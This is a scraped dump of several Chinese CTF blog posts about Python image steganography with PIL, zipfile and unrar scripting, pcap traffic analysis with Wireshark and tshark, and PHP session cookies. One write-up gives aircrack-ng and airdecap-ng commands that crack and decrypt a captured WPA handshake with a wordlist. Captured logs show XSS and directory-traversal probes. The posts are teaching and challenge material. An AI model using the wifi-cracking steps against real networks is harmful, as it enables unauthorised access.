Image.open(&#x27;flag.jpg&#x27;)box = (150,150,245,280)img = im.crop(box)img.show() box，是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。假设box是(b1,a1,b2,a2)，则所取区域是以各自坐标划线所围的区域。 图片黏贴paste() 12345im = Image.open(&#x27;flag.jpg&#x27;)box = (50,50,200,200)region = im.crop(box)im.paste(region,box)im.show() 图像分帧seek()和tell() tell是读取帧数，而seek是取当前帧数的图片。 1234567891011from PIL import Imageim = Image.open(&quot;flag.gif&quot;)im.seek(1)im.show()try: while 1: im.seek(im.tell()+1) im.show()except EOFError: pass 常见CTF题目基础知识图片模式9种，分别为1，L，P，RGB，RGBA，CMYK，YCbCr，I，F。 12345678910111213141516171819202122232425262728293031模式&quot;1&quot;为二值图像，非黑即白。但是它每个像素用8个bit表示，0表示黑，255表示白。模式L&quot;为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;L&quot;模式是按照下面的公式转换的 L &#x3D; R * 299&#x2F;1000 + G * 587&#x2F;1000+ B * 114&#x2F;1000模式&quot;P&quot;为8位彩色图像，它的每个像素用8个bit表示，其对应的彩色值是按照调色板查询出来的。模式&quot;RGBA&quot;为32位彩色图像，它的每个像素用32个bit表示，其中24bit表示红色、绿色和蓝色三个通道，另外8bit表示alpha通道，即透明通道。模式&quot;CMYK&quot;为32位彩色图像，它的每个像素用32个bit表示。模式&quot;CMYK&quot;就是印刷四分色模式，它是彩色印刷时采用的一种套色模式，利用色料的三原色混色原理，加上黑色油墨，共计四种颜色混合叠加，形成所谓&quot;全彩印刷&quot;。 四种标准颜色是：C：Cyan &#x3D; 青色，又称为&#39;天蓝色&#39;或是&#39;湛蓝&#39;M：Magenta &#x3D; 品红色，又称为&#39;洋红色&#39;；Y：Yellow &#x3D; 黄色；K：Key Plate(blacK) &#x3D; 定位套版色（黑色）。PIL中&quot;RGB&quot;转换为&quot;CMYK&quot;的公式如下： C &#x3D; 255 - R M &#x3D; 255 - G Y &#x3D; 255 - B K &#x3D; 0模式&quot;YCbCr&quot;为24位彩色图像，它的每个像素用24个bit表示。YCbCr其中Y是指亮度分量，Cb指蓝色色度分量，而Cr指红色色度分量。人的肉眼对视频的Y分量更敏感，因此在通过对色度分量进行子采样来减少色度分量后，肉眼将察觉不到的图像质量的变化。 模式&quot;RGB&quot;转换为&quot;YCbCr&quot;的公式如下： Y&#x3D; 0.257*R+0.504*G+0.098*B+16 Cb &#x3D; -0.148*R-0.291*G+0.439*B+128 Cr &#x3D; 0.439*R-0.368*G-0.071*B+128模式&quot;I&quot;为32位整型灰色图像，它的每个像素用32个bit表示，0表示黑，255表示白，(0,255)之间的数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;I&quot;模式是按照下面的公式转换的： I &#x3D; R * 299&#x2F;1000 + G * 587&#x2F;1000 + B * 114&#x2F;1000模式&quot;F&quot;为32位浮点灰色图像，它的每个像素用32个bit表示，0表示黑，255表示白，(0,255)之间的数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;F&quot;模式是按照下面的公式转换的： F &#x3D; R * 299&#x2F;1000+ G * 587&#x2F;1000 + B * 114&#x2F;1000 模式&quot;F&quot;与模式&quot;L&quot;的转换公式是一样的，都是RGB转换为灰色值的公式，但模式&quot;F&quot;会保留小数部分.模式&quot;RGB&quot;为24位彩色图像，它的每个像素用24个bit表示，分别表示红色、绿色和蓝色三个通道。 在PIL中，对于彩色图像，open后都会转换为&quot;RGB&quot;模式，然后该模式可以转换为其他模式，比如&quot;1&quot;、&quot;L&quot;、&quot;P&quot;和&quot;RGBA&quot;，这几种模式也可以转换为&quot;RGB&quot;模式。 gif拿到许多图片，只有全白和全黑，考虑白色是0，黑色是1。 首先获取指定坐标的rgb，然后写脚本转换成二进制，二进制转化ascii。 1234from PIL import Imageimg = Image.open(&#x27;./gif/0.jpg&#x27;)print(list(img.getpixel((1,1)))) 1234567891011from PIL import Imageflag=&quot;&quot;for i in range(0,104): img = Image.open(&#x27;./gif/&#123;&#125;.jpg&#x27;.format(i)) if list(img.getpixel((1,1)))==[255,255,255]: flag+=&#x27;0&#x27; else: flag+=&#x27;1&#x27;for i in range(0,len(flag),8): flag+=chr(int(flag[i:i+8],2))print(flag) glance.gif具体思路就是分帧，粘贴，但是在写脚本的时候还需要仔细一点，有许多细节需要处理。 123456789101112131415161718from PIL import Imageim=Image.open(&#x27;glance.gif&#x27;)i=0try: while 1: i+=1 im.seek(im.tell()+1) im.save(&#x27;./gif/&#123;&#125;.png&#x27;.format(i))except EOFError: passim2=Image.new(&#x27;RGBA&#x27;,(2*201,600))width = 0for i in range(1,201): image=Image.open(&#x27;./gif/&#123;&#125;.png&#x27;.format(i)) im2.paste(image,(width,0,2+width,600)) width = width +2im2.save(&#x27;flag.png&#x27;)im2.show() 在一开始处理的时候，我是直接拼接的图片，没有尝试先去打开一个图片(open)然后粘贴，程序报错。 ValueError: unknown color specifier: &#39;./gif/1.png&#39;。 12image=Image.open(&#x27;./gif/&#123;&#125;.png&#x27;.format(i))#这个很重要。im2.paste(image,(width,0,2+width,600)) 这里的坐标位置一定要处理好，首先我们需要知道，图像的高度和宽度。由于只需要横向粘贴，也就是说图片都需要集中在一行上，所以第二个坐标一定是0，第四个坐标一定是图片的高度。每个图片宽2，所以第一个和第二个坐标相差2，每张图片的间隔距离也是2。 1im2.paste(image,(width,0,2+width,600)) LSB隐写任何一个像素点的颜色可由三原色RGB确定，每个颜色有8bit，因而RGB最大取值为 (255, 255, 255)——RGB一共包含2563=16777216‬2563=16777216‬（1600万）种颜色，而人眼可以区分约1000万种不同的颜色，这意味着剩余约600万种颜色人眼无法识别。 LSB隐写就是将信息藏在各个像素点的某个颜色的最后一位上，因为是最后一位，对颜色的更改是人眼无法识别出来的，起到了隐藏的效果。 例子： 倘若在一张图片中，我们想隐藏 A 这个信息，那么先将 A 的十六进制Unicode码 0x61 转换为二进制 01100001我们在三原色中随机选择一种颜色——比如说红，因为要隐藏的 A 占8个位，所以在这张图片中任意选择连续的8个像素点，将这8个像素点的RGB，代表红色的8bit的最后一位，依次修改为 01100001。 举个例子： 假设您想要将消息”A”隐藏到一个4x4的图像中，该图像具有以下像素值： 1[(225, 12, 99), (155, 2, 50), (99, 51, 15), (15, 55, 22),(155, 61, 87), (63, 30, 17), (1, 55, 19), (99, 81, 66),(219, 77, 91), (69, 39, 50), (18, 200, 33), (25, 54, 190)] 使用 ASCII 表 ，我们可以先将机密消息转换为十进制值，然后再转换为二进制：0110100。现在，我们对像素值逐一进行迭代，在将它们转换为二进制后，我们将每个最小有效位依次替换为该信息位。（例如 225 是 11100001，我们替换最后一位，最右边的（1）和机密消息的第一位（0），依次类推)。这样的操作只会对像素值进行 +1 或 -1 的修改，因此肉眼根本看不出来。执行最低有效位隐写术后得到的像素值如下所示： 1[(224, 13, 99),(154, 3, 50),(98, 50, 15),(15, 54, 23),(154, 61, 87),(63, 30, 17),(1, 55, 19),(99, 81, 66),(219, 77, 91),(69, 39, 50),(18, 200, 33),(25, 54, 190)] png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。 查看图片模式 1234from PIL import Imageimg = Image.open(&#x27;01.png&#x27;)width,height=img.sizeprint(img.mode) 可以看到图片是L模式。最大特点就是像素没有r,g,b这么多，只有1个。 取图片的像素值的二进制的最后一位与1与运算，得到的数据如果为0则是白色，如果为1则是黑色。 12345678910from PIL import Imageimg = Image.open(&#x27;01.png&#x27;)width,height=img.sizeprint(img.mode)flag=&quot;&quot;for i in range(0,width): for j in range(0,height): tmp = img.getpixel((i,j)) print(&quot;原本像素为：&quot;,tmp) print(tmp&amp;1) 1234567891011from PIL import Imageimg = Image.open(&#x27;01.bmp&#x27;)width,height=img.sizefor i in range(0,width): for j in range(0,height): tmp = img.getpixel((i,j)) if tmp&amp;0x1 == 0: img.putpixel((i,j),0) else: img.putpixel((i,j),255)img.show()","categories":[{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/categories/CTF-python/"}],"tags":[{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/tags/CTF-python/"}]},{"title":"CTF-python库zipfile的使用","slug":"CTF-python库zipfile的使用","date":"2019-04-10T05:12:20.000Z","updated":"2020-11-15T10:01:05.484Z","comments":true,"path":"2019/04/10/CTF-python库zipfile的使用/","link":"","permalink":"http://s1eady.top/2019/04/10/CTF-python%E5%BA%93zipfile%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"CTF–python库zipfile的使用zipfile库简介Python zipfile模块用来做zip格式编码的压缩和解压缩的，要进行相关操作，首先需要实例化一个 ZipFile 对象。ZipFile 接受一个字符串格式压缩包名称作为它的必选参数，第二个参数为可选参数，表示打开模式，类似于文件操作，有r/w/a三种模式，分别代表读、写、添加，默认为r，即读模式。 zipfile里有两个非常重要的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。 使用方式ZipFile 对象定义 1zipfile.ZipFile(file,mode,compress_type,allowZip64) #创建一个ZipFile对象 1234file: zip文件名mode: &#x27;r&#x27;读已存在的zip文件,&#x27;w&#x27;新建或覆盖已存在的zip文件,&#x27;a&#x27;附加到现存的 zip文档compress_type: zipfile.ZIP_STORED 默认不压缩, zipfile.ZIP_DEFLATED 压缩allowZip64 : 默认 False, zip超过2G设置为True 以只读的方式打开一个zip文件。 123import zipfilez=zipfile.ZipFile(&quot;flag.zip&quot;,&quot;r&quot;)print(z) 输出 1&lt;zipfile.ZipFile filename=&#x27;flag.zip&#x27; mode=&#x27;r&#x27;&gt; ZipFile 成员函数 ZipFile.getinfo(name) #获取zip文档内指定文件信息, 返回zipfile.ZipInfo对象 ZipFile.infolist() #获取zip文档内所有文件信息, 返回zipfile.ZipInfo列表 ZipFile.namelist() #获取zip文档内所有文件的名称列表 ZipFile.extract(member,path,pwd) #把zip文档内指定文件解压到指定目录 member : 要解压的文件名称或ZipInfo对象 path : 指定解压目录(默认当前目录) pwd : 解压密码 ZipFile.extractall(path,members,pwd) #解压zip文档到指定目录 path : 解压目的目录, 默认当前目录 members : 设置的文件名列表, 默认全部 pwd : 解压密码 ZipFile.printdir() #打印zip文档信息 ZipFile.setpassword(pwd) #设置zip文档密码 pwd : 解压密码 ZipFile.read(name,pwd) #获取zip文档内指定文件的二进制 name : zip文档内指定文件 pwd : 解压密码 ZipFile.write(filename,arcname,compress_type) #添加指定文件到zip文档中 filename : 文件路径 arcname : 保存的名称 compress_type : zipfile.ZIP_STORED 默认不压缩, zipfile.ZIP_DEFLATED 压缩 ZipFile.writestr(zinfo_or_arcname,bytes) #直接写二进制到压缩文档 z.Zipinfo()z.infolist(), 它返回的就是压缩包内所有文件的信息，就是一个ZipInfo的列表。以下是一些压缩包常用的属性。比较常用的是 filename, file_size, header_offset, 分别为文件名，文件大小，文件数据在压缩包中的偏移，在打CTF的时候我们也常使用CRC，进行CRC爆破。 ZipInfo.filename #文件名称 ZipInfo.date_time #最后修改时间, 返回(年,月,日,时,分,秒)的元组 ZipInfo.compress_type #压缩类型 ZipInfo.comment #文档说明 ZipInfo.extr #扩展项数据 ZipInfo.create_system #创建该文档的系统 ZipInfo.create_version #创建该文档的PKZIP版本 ZipInfo.extract_version #解压该文档所需的PKZIP版本 ZipInfo.reserved #预留字段 ZipInfo.flag_bits #zip标志位 ZipInfo.volume #文件头的卷标 ZipInfo.internal_attr #内部属性 ZipInfo.external_attr #外部属性 ZipInfo.header_offset #文件头偏移位 ZipInfo.CRC #未压缩文件的CRC-32 ZipInfo.compress_size #压缩后大小 ZipInfo.file_size #未压缩大小 12345import zipfilez=zipfile.ZipFile(&quot;flag.zip&quot;,&quot;r&quot;)print(z.infolist())for i in z.infolist(): print(i.filename,i.CRC) 输出 12[&lt;ZipInfo filename=&#x27;flag.png&#x27; compress_type=deflate external_attr=0x20 file_size=13642 compress_size=1592&gt;]flag.png 1926850634 z.namelist()z.namelist() 会返回压缩包内所有文件名的列表。 12345import zipfilez=zipfile.ZipFile(&quot;flag.zip&quot;,&quot;r&quot;)print(z.namelist())for i in z.namelist(): print(i) 输出 12[&#x27;flag.png&#x27;]flag.png z.read()获取zip文档内指定文件的二进制数据。 123456import zipfilez=zipfile.ZipFile(&quot;flag.zip&quot;,&quot;r&quot;)print(z.infolist())for i in z.infolist(): date=z.read(i.filename) print(date) 输出文件的二进制形式，可以通过open函数对文件进行操作，将二进制形式写入文件中。 z.write()1ZipFile.write(filename[, arcname[, compress_type]]) 将指定文件添加到zip文档中。filename为文件路径，arcname为添加到zip文档之后保存的名称, 参数compress_type表示压缩方法，它的值可以是zipfile. ZIP_STORED 或zipfile. ZIP_DEFLATED。 123import zipfilez=zipfile.ZipFile(r&quot;steady.zip&quot;,&quot;w&quot;)z.write(&#x27;./flag.png&#x27;,&#x27;steady.png&#x27;) 使用之后会在当前目录生成一个steady.zip的压缩包，压缩包的内容为steady.png。 z.extract()1ZipFile.extract(member[, path[, pwd]]) 将zip文档内的指定文件解压到当前目录。参数member指定要解压的文件名称或对应的ZipInfo对象；参数path指定了解析文件保存的文件夹；参数pwd为解压密码。 123import zipfilez=zipfile.ZipFile(&quot;steady.zip&quot;)z.extract(z.namelist()[0],&#x27;./gif/&#x27;) 注意extract的使用对象是zipfile对象，它提取的文件名字是压缩包内的名字而不是压缩包的名字。 z.extractall()1ZipFile.extractall([path[, members[, pwd]]]) 解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置，选择要解压的文件名称。 unrar库简介unrar第三方python库是解压rar压缩文件的扩展包，可实现对rar压缩文件的读取、解压等处理。也可以使用unrar这个模块来进行编写rar压缩文件暴力破解。 使用方式rar对象123from unrar import rarfile rar = rarfile.RarFile(&#x27;flag.rar&#x27;,&#x27;r&#x27;)print(rar) 输出 1&lt;unrar.rarfile.RarFile object at 0x000002B0FC347880&gt; rarfile成员对象函数rar.namelist()123from unrar import rarfile rar = rarfile.RarFile(&#x27;flag.rar&#x27;,&#x27;r&#x27;)print(rar.namelist()) 输出 1[&#x27;flag.png&#x27;] rar.printdir()打印rar压缩文件中的文件列表。 123from unrar import rarfile rar = rarfile.RarFile(&#x27;flag.rar&#x27;,&#x27;r&#x27;)rar.printdir() 输出 12File Name Modified Sizeflag.png 2020-11-01 10:11:02 13642 rar.extractall()解压rar压缩文件。 1rf.extract(文件名字, 解压文件存放的路径) CTF题目利用CMP03 Multiple文件名称就是压缩包的密码。使用python批量解压。 123456789101112import osfrom unrar import rarfiledef unzip(zipname): while True: passwd = zipname[0:6] zf = rarfile.RarFile(&#x27;C:/Users/12521/gif/&#x27;+zipname,&#x27;r&#x27;) zf.extractall(&#x27;./gif/&#x27;,pwd=passwd)# zf.close() os.remove(zipname) zipname = zf.namelist()[0].replace(&#x27;\\\\&#x27;,&#x27;/&#x27;) print(zipname)unzip(&quot;flag.rar&quot;) qctl.zip同理 12345678910import zipfile,osdef unzip(zipname): while True: passwd = zipname.split(&#x27;.&#x27;)[0] zf = zipfile.ZipFile(zipname,&#x27;r&#x27;) zf.extractall(pwd=passwd.encode()) zf.close() os.remove(zipname) zipname = zf.namelist()[0]unzip(&quot;qctl.zip&quot;)","categories":[{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/categories/CTF-python/"}],"tags":[{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/tags/CTF-python/"}]},{"title":"CTF-流量分析题2","slug":"CTF-流量分析题2","date":"2019-04-08T22:34:56.000Z","updated":"2020-10-25T08:11:48.680Z","comments":true,"path":"2019/04/09/CTF-流量分析题2/","link":"","permalink":"http://s1eady.top/2019/04/09/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%982/","excerpt":"","text":"CTF-流量分析题2dhcp.pcap1What IP address is requested by the client? Wireshark没有专门用于DHCP流量的内置显示筛选器，但确实具有用于基础协议BOOTP的显示筛选器。 阅读[Wireshark Wiki的DHCP页面和BOOTP显示过滤器参考我们发现我们可以对BOOTP选项类型进行过滤以仅过滤DHCP请求。 1bootp.option.dhcp &#x3D;&#x3D; 3 1flag&lt;192.168.2.244&gt; 1What is the transaction ID for the DHCP release? 1bootp.option.dhcp &#x3D;&#x3D; 7 1What is the MAC address of the client? 1bootp.option.dhcp &#x3D;&#x3D; 3 问题1的DHCP请求，我们可以简单地检查数据包详细信息并读取“客户端MAC地址”字段。 1flag&lt;00:0C:29:82:F5:94&gt; dns.pcap1What is the response for the lookup for flag.fruitinc.xyz? 检查“数据包详细信息”的“答案”部分，我们发现包含该标志的TXT记录。 1Which root server responds to the query? PCAP中的第一个DNS响应包含DNS根服务器列表。 backdoor++.pcap分析协议发现有icmp协议，直接搜索flag，每次搜索一个字符，发现在icmp数据包的data字段的第一个十六进制对应flag的每一个字符。 数据提取 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;backdoor++.pcap -T fields -Y &quot;icmp&quot; -e &quot;data&quot; &gt; 1.txt 拿到flag 123456f&#x3D;open(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&quot;,&quot;r&quot;)flag&#x3D;&quot;&quot;for i in f.readlines(): if len(i)&#x3D;&#x3D;27: flag+&#x3D;chr(int(i[:2],16))print(flag) cacosmia.cap无线wifi流量包 1234567891011121314151617181920212223242526272829steady@steady:~$ aircrack-ng &#x2F;tmp&#x2F;cacosmia.capOpening &#x2F;tmp&#x2F;cacosmia.capait...Read 4276 packets. # BSSID ESSID Encryption 1 1A:D7:17:98:D0:51 mamawoxiangwantiequan WPA (1 handshake)Choosing first network as target.Opening &#x2F;tmp&#x2F;cacosmia.capait...Read 4276 packets.1 potential targetsPlease specify a dictionary (option -w).破解密码steady@steady:~$ aircrack-ng &#x2F;tmp&#x2F;cacosmia.cap -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fern-wifi&#x2F;common.txtsteady@steady:~$ airdecap-ng &#x2F;tmp&#x2F;cacosmia.cap -e mamawoxiangwantiequan -p 12345678Total number of stations seen 6Total number of packets read 4276Total number of WEP data packets 0Total number of WPA data packets 685Number of plaintext data packets 0Number of decrypted WEP packets 0Number of corrupted WEP packets 0Number of decrypted WPA packets 538Number of bad TKIP (WPA) packets 0Number of bad CCMP (WPA) packets 0 破解出一个pcap流量包。发现一个post请求有一个图片，图片里面有个压缩包，压缩包里面就是flag，然后发现cookie中JWT有hint，hint提示压缩包密码是ping的网址。所以直接搜索dns协议，找到最后一个地址就是密码。 铁人三项2018第一次攻击是sql注入攻击，攻击IP为202.1.1.2，受害者为192.168.1.8。 分析其中一个数据包可以得知注入参数为list[select]，使用的工具为sqlmap、版本为1.1.3.2。 使用wireshark过滤这两个IP的通信。 http and ip.addr == 202.1.1.2 and ip.addr == 192.168.1.8","categories":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"tshark的使用","slug":"流量分析--tshark的使用","date":"2019-04-08T22:34:56.000Z","updated":"2020-10-20T11:34:13.665Z","comments":true,"path":"2019/04/09/流量分析--tshark的使用/","link":"","permalink":"http://s1eady.top/2019/04/09/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--tshark%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"tshark的使用常用选项-r1-r 提取如wireshark表格中显示的封包摘要信息 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;simple.pcap 1234567891011121314154752 69.735989 3.4.1 → host USB 31 URB_INTERRUPT in4753 69.751990 3.4.1 → host USB 31 URB_INTERRUPT in4754 69.767990 3.4.1 → host USB 31 URB_INTERRUPT in4755 69.783991 3.4.1 → host USB 31 URB_INTERRUPT in4756 69.791992 3.4.1 → host USB 31 URB_INTERRUPT in4757 69.799992 3.4.1 → host USB 31 URB_INTERRUPT in4758 69.807993 3.4.1 → host USB 31 URB_INTERRUPT in4759 69.815993 3.4.1 → host USB 31 URB_INTERRUPT in4760 69.823994 3.4.1 → host USB 31 URB_INTERRUPT in4761 69.831994 3.4.1 → host USB 31 URB_INTERRUPT in4762 69.839995 3.4.1 → host USB 31 URB_INTERRUPT in4763 69.847995 3.4.1 → host USB 31 URB_INTERRUPT in4764 69.855996 3.4.1 → host USB 31 URB_INTERRUPT in4765 69.863996 3.4.1 → host USB 31 URB_INTERRUPT in4766 69.887997 3.4.1 → host USB 31 URB_INTERRUPT in -Y1-Y 使用filter过滤器 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;1.pcapng -Y &quot;http&quot; 12345678910111213141516steady@steady:~$ tshark -r &#x2F;tmp&#x2F;1.pcapng -Y &quot;http&quot; 6 2.733155 10.211.55.2 → 10.211.55.15 HTTP 418 GET &#x2F; HTTP&#x2F;1.1 9 2.734199 10.211.55.15 → 10.211.55.2 HTTP 479 HTTP&#x2F;1.1 200 OK (text&#x2F;html) 11 2.750160 10.211.55.2 → 10.211.55.15 HTTP 439 GET &#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png HTTP&#x2F;1.1 39 2.752178 10.211.55.15 → 10.211.55.2 HTTP 1359 HTTP&#x2F;1.1 200 OK (text&#x2F;html) 45 2.752432 10.211.55.2 → 10.211.55.15 HTTP 454 GET &#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png HTTP&#x2F;1.1 48 2.753155 10.211.55.2 → 10.211.55.15 HTTP 435 GET &#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker HTTP&#x2F;1.1 73 2.754659 10.211.55.15 → 10.211.55.2 HTTP 1360 HTTP&#x2F;1.1 200 OK (text&#x2F;html) 100 2.755748 10.211.55.15 → 10.211.55.2 HTTP 1360 HTTP&#x2F;1.1 200 OK (text&#x2F;html) 108 7.600648 10.211.55.2 → 10.211.55.15 HTTP 477 GET &#x2F;xss&#x2F;example2.php?name&#x3D;hacker HTTP&#x2F;1.1 110 7.601890 10.211.55.15 → 10.211.55.2 HTTP 962 HTTP&#x2F;1.1 200 OK (text&#x2F;html) 112 7.731620 10.211.55.2 → 10.211.55.15 HTTP 398 GET &#x2F;favicon.ico HTTP&#x2F;1.1 127 7.732494 10.211.55.15 → 10.211.55.2 HTTP 515 HTTP&#x2F;1.1 200 OK (PNG) 131 11.272270 10.211.55.2 → 10.211.55.15 HTTP 446 GET &#x2F;xss&#x2F;example2.php?name&#x3D;hacker HTTP&#x2F;1.1 132 11.273046 10.211.55.15 → 10.211.55.2 HTTP 961 HTTP&#x2F;1.1 200 OK (text&#x2F;html) 154 28.236845 10.211.55.2 → 10.211.55.15 HTTP 484 GET &#x2F;xss&#x2F;example2.php?name&#x3D;%3Cscript%3Ealert(%27tshark%27)%3C&#x2F;script%3E HTTP&#x2F;1.1 -T123默认text fields (需要增加-e参数)其他选项 ek|json|jsonraw|pdml|ps|psml|tabs -e1-e 指定一个字段 实例提取Info、Source、Time列 1steady@steady:~$ tshark -r /tmp/1.pcapng -T fields -e &quot;_ws.col.Source&quot; 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;1.pcapng -T fields -e &quot;_ws.col.Info&quot; 123456789101112131415161718192021GET /sqli/example2.php?name=000 HTTP/1.1 80 → 52564 [ACK] Seq=1 Ack=361 Win=6912 Len=0 TSval=4294962248 TSecr=802150771HTTP/1.1 200 OK [TCP segment of a reassembled PDU]HTTP/1.1 200 OK (text/html)52564 → 80 [ACK] Seq=361 Ack=1782 Win=129984 Len=0 TSval=802150773 TSecr=429496224980 → 52564 [FIN, ACK] Seq=1782 Ack=361 Win=6912 Len=0 TSval=4294962249 TSecr=80215077352564 → 80 [ACK] Seq=361 Ack=1783 Win=131072 Len=0 TSval=802150773 TSecr=429496224952564 → 80 [FIN, ACK] Seq=361 Ack=1783 Win=131072 Len=0 TSval=802150773 TSecr=429496224980 → 52564 [ACK] Seq=1783 Ack=362 Win=6912 Len=0 TSval=4294962249 TSecr=80215077352565 → 80 [SYN, ECN, CWR] Seq=0 Win=65535 Len=0 MSS=1460 WS=32 TSval=802150779 TSecr=0 SACK_PERM=180 → 52565 [SYN, ACK, ECN] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=4294962251 TSecr=802150779 WS=6452565 → 80 [ACK] Seq=1 Ack=1 Win=131744 Len=0 TSval=802150779 TSecr=4294962251GET /sqli/example2.php?name=000 HTTP/1.1 80 → 52565 [ACK] Seq=1 Ack=361 Win=6912 Len=0 TSval=4294962251 TSecr=802150779HTTP/1.1 200 OK [TCP segment of a reassembled PDU]HTTP/1.1 200 OK (text/html)80 → 52565 [FIN, ACK] Seq=1782 Ack=361 Win=6912 Len=0 TSval=4294962251 TSecr=80215077952565 → 80 [ACK] Seq=361 Ack=1782 Win=129984 Len=0 TSval=802150781 TSecr=429496225152565 → 80 [ACK] Seq=361 Ack=1783 Win=131072 Len=0 TSval=802150781 TSecr=429496225152565 → 80 [FIN, ACK] Seq=361 Ack=1783 Win=131072 Len=0 TSval=802150781 TSecr=429496225180 → 52565 [ACK] Seq=1783 Ack=362 Win=6912 Len=0 TSval=4294962251 TSecr=802150781 过滤表达式可以直接通过wireshark获取","categories":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"session、cookie原理","slug":"session、cookie原理","date":"2019-02-04T18:40:36.000Z","updated":"2020-11-19T06:51:58.025Z","comments":true,"path":"2019/02/05/session、cookie原理/","link":"","permalink":"http://s1eady.top/2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/","excerpt":"","text":"session、cookie原理实例登陆前session_start() 用户第一次访问文件(含有session_start函数的文件) 用户第一次访问是没有PHPSESSID,所以会创建$_SESSION变量,同时创建sess_abc123的session文件,将abc123作为PHPSESSID的值返回给浏览器 比如: 我们在从未提交过表单,也就是没有访问login.php,因此session_start函数不会触发,PHPSESSID也不会存在 cookie中不会存在任何PHPSESSID值 没有访问服务器之前,我们的请求是不会带上PHPSESSID的 用户提交表单到服务器(login.php),此时无论是否密码、账号是否正确,都会出发session_start函数,进而生成PHPSESSID值 然后我们在每一个请求服务器的时候都会带上PHPSESSID 登陆后登陆之后,通过以下代码设置cookie 12setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); 我们在前端可以使用js获取到cookie值 HttpOnly设置每个cookie都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过cookie选项来设置的，cookie选项包括：expires、domain、path、secure、HttpOnly。在设置任一个cookie时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**分号和一个空格**隔开。 这个选项用来设置cookie是否能通过 js 去访问。默认情况下，cookie不会带httpOnly选项(即为空)，所以默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）这个cookie。 注意:只有设置了setcookie的第七个参数为true的时候 document.cookie才是空的,即使在php.ini里面设置了session.cookie_httponly=On并且设置了session.cookie_httponly 这个属性(ini_set(&quot;session.cookie_httponly&quot;, 1);)，但是在浏览器还是能获取到cookie的信息,只要setcookie的第七个参数不设置为true,document.cookie依然能取到值。 源码login.html 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt; &lt;title&gt;会员登录&lt;&#x2F;title&gt; &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; ul li&#123;margin:0;padding:0;&#125; form&#123;margin:40px 30px 0;&#125; form li&#123;list-style:none;padding:5px 0;&#125; form li label&#123;float:left;width:70px;text-align:right&#125; form li a&#123;font-size:12px;color:#999;text-decoration:none&#125; .login_btn&#123;border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;&#125; form li img&#123;vertical-align:top&#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;用户登录&lt;&#x2F;legend&gt; &lt;ul&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt;用户名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt;密码:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&#x2F;&gt; &lt;&#x2F;li&gt; 